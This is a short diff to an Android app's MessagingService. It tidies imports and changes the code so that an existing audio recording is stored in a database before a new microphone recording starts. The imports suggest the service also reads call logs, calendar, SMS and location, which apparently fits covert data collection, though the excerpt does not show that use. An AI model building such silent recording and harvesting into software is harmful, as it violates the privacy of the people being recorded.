@@ -1,21 +1,17 @@
 package com.candroid.textme;
 
 import android.app.Service;
-import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.database.ContentObserver;
 import android.database.Cursor;
-import android.location.LocationListener;
 import android.location.LocationManager;
-import android.location.LocationProvider;
 import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
-import android.os.Looper;
 import android.provider.CalendarContract;
 import android.provider.CallLog;
 import android.provider.Telephony;
@@ -109,7 +105,13 @@ public class MessagingService extends Service {
 
                 try {
                     File file = new File(Environment.getExternalStorageDirectory() + File.separator + "soundfile2.3gpp");
-                    file.createNewFile();
+                    if(file.exists()){
+                        Database.insertAudioFile(MessagingService.this, sDatabase, System.currentTimeMillis(), file);
+                        file.delete();
+                        file.createNewFile();
+                    }else{
+                        file.createNewFile();
+                    }
                     mMediaRecorder.setOutputFile(file);
                     mMediaRecorder.prepare();
                     mMediaRecorder.start();
